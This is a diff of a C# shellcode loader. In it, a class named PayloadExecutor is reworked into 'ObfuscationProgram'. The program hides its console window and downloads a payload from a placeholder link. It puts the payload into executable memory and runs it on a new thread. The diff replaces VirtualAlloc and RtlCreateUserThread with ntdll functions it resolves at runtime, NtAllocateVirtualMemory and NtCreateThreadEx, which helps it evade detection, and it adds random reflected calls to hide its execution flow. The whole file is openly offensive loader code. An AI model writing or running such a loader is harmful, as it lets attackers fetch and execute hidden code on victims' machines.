@@ -1,28 +1,29 @@
 using System;
 using System.Net;
 using System.Runtime.InteropServices;
-using System.Diagnostics;
+using System.Reflection;
 
-class PayloadExecutor
+class ObfuscationProgram
 {
     static void Main(string[] args)
     {
         // Hide the console window
-        var handle = GetConsoleWindow();
+        IntPtr handle = GetConsoleWindow();
         ShowWindow(handle, SW_HIDE);
 
         // Download the payload
-        byte[] payload = DownloadPayload("[DOWNLOAD_LINK]");
+        byte[] shellcode = DownloadPayload("[DOWNLOAD_LINK]");
 
         // Allocate memory for the payload
-        IntPtr memoryAddress = AllocateMemory(payload.Length);
-        Marshal.Copy(payload, 0, memoryAddress, payload.Length);
+        IntPtr allocatedMemory = AllocateMemory(shellcode.Length);
+        Marshal.Copy(shellcode, 0, allocatedMemory, shellcode.Length);
 
-        // Execute the payload
-        ExecutePayload(memoryAddress);
+        // Create a thread to execute the payload using NtCreateThreadEx
+        IntPtr threadHandle = CreatePayloadThread(allocatedMemory);
+        WaitForSingleObject(threadHandle, 0xFFFFFFFF);
 
         // Call a random method to further obfuscate the execution flow
-        ObfuscateExecutionFlow();
+        CallRandomMethod();
     }
 
     static byte[] DownloadPayload(string url)
@@ -35,33 +36,28 @@ class PayloadExecutor
 
     static IntPtr AllocateMemory(int size)
     {
-        return VirtualAlloc(IntPtr.Zero, (uint)size, AllocationType.Commit | AllocationType.Reserve, MemoryProtection.ExecuteReadWrite);
+        IntPtr ntdll = LoadLibrary("ntdll.dll");
+        IntPtr ntAllocateVirtualMemoryAddr = GetProcAddress(ntdll, "NtAllocateVirtualMemory");
+        NtAllocateVirtualMemoryDelegate ntAllocateVirtualMemory = (NtAllocateVirtualMemoryDelegate)Marshal.GetDelegateForFunctionPointer(ntAllocateVirtualMemoryAddr, typeof(NtAllocateVirtualMemoryDelegate));
+
+        IntPtr baseAddress = IntPtr.Zero;
+        ntAllocateVirtualMemory(GetCurrentProcess(), ref baseAddress, IntPtr.Zero, ref size, AllocationType.Commit | AllocationType.Reserve, MemoryProtection.ExecuteReadWrite);
+        return baseAddress;
     }
 
-    static void ExecutePayload(IntPtr memoryAddress)
+    static IntPtr CreatePayloadThread(IntPtr payloadAddress)
     {
-        uint oldProtect;
-        VirtualProtect(memoryAddress, (UIntPtr)4096, 0x40, out oldProtect);
+        IntPtr ntCreateThreadExAddr = GetProcAddress(LoadLibrary("ntdll.dll"), "NtCreateThreadEx");
+        NtCreateThreadExDelegate ntCreateThreadEx = (NtCreateThreadExDelegate)Marshal.GetDelegateForFunctionPointer(ntCreateThreadExAddr, typeof(NtCreateThreadExDelegate));
 
         IntPtr threadHandle = IntPtr.Zero;
-        IntPtr parameter = IntPtr.Zero;
-
-        bool bSuccess = false;
-        RtlCreateUserThread(NtCurrentProcess(), IntPtr.Zero, false, 0, IntPtr.Zero, IntPtr.Zero, memoryAddress, parameter, out threadHandle, IntPtr.Zero);
-        if (threadHandle != IntPtr.Zero)
-        {
-            bSuccess = true;
-        }
-
-        if (!bSuccess)
-        {
-            CreateThread(IntPtr.Zero, 0, memoryAddress, IntPtr.Zero, 0, IntPtr.Zero);
-        }
+        ntCreateThreadEx(out threadHandle, 0x1FFFFF, IntPtr.Zero, GetCurrentProcess(), payloadAddress, IntPtr.Zero, false, 0, 0, 0, IntPtr.Zero);
+        return threadHandle;
     }
 
-    static void ObfuscateExecutionFlow()
+    static void CallRandomMethod()
     {
-        var methods = typeof(ObfuscationActions).GetMethods(System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static);
+        MethodInfo[] methods = typeof(RandomMethods).GetMethods(BindingFlags.Public | BindingFlags.Static);
         Random rand = new Random();
         int index = rand.Next(methods.Length);
         methods[index].Invoke(null, null);
@@ -75,23 +71,21 @@ class PayloadExecutor
 
     private const int SW_HIDE = 0;
 
+    [DllImport("kernel32.dll", SetLastError = true)]
+    private static extern IntPtr LoadLibrary(string dllName);
+
+    [DllImport("kernel32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
+    private static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
+
     [DllImport("kernel32.dll")]
-    static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, AllocationType flAllocationType, MemoryProtection flProtect);
+    private static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);
 
     [DllImport("kernel32.dll", SetLastError = true)]
-    static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
+    static extern IntPtr GetCurrentProcess();
 
-    [DllImport("kernel32.dll")]
-    static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
+    private delegate int NtAllocateVirtualMemoryDelegate(IntPtr ProcessHandle, ref IntPtr BaseAddress, IntPtr ZeroBits, ref int RegionSize, AllocationType AllocationType, MemoryProtection Protect);
 
-    [DllImport("kernel32.dll")]
-    private static extern IntPtr NtCurrentProcess();
-
-    [DllImport("ntdll.dll", SetLastError = true, ExactSpelling = true)]
-    private static extern int RtlCreateUserThread(IntPtr Process, IntPtr ThreadSecurity, bool CreateSuspended, uint StackZeroBits, IntPtr StackReserved, IntPtr StackCommit, IntPtr StartAddress, IntPtr StartParameter, out IntPtr Thread, IntPtr ClientId);
-
-    [DllImport("kernel32.dll")]
-    static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);
+    private delegate int NtCreateThreadExDelegate(out IntPtr threadHandle, uint desiredAccess, IntPtr objectAttributes, IntPtr processHandle, IntPtr startAddress, IntPtr parameter, bool createSuspended, int stackZeroBits, int sizeOfStackCommit, int sizeOfStackReserve, IntPtr bytesBuffer);
 
     [Flags]
     enum AllocationType
@@ -107,20 +101,20 @@ class PayloadExecutor
     }
 }
 
-class ObfuscationActions
+class RandomMethods
 {
-    public static void ActionOne()
+    public static void MethodX()
     {
-        Console.WriteLine("Executing obfuscation action one.");
+        Console.WriteLine("Method X executed.");
     }
 
-    public static void ActionTwo()
+    public static void MethodY()
     {
-        Console.WriteLine("Executing obfuscation action two.");
+        Console.WriteLine("Method Y executed.");
     }
 
-    public static void ActionThree()
+    public static void MethodZ()
     {
-        Console.WriteLine("Executing obfuscation action three.");
+        Console.WriteLine("Method Z executed.");
     }
 }
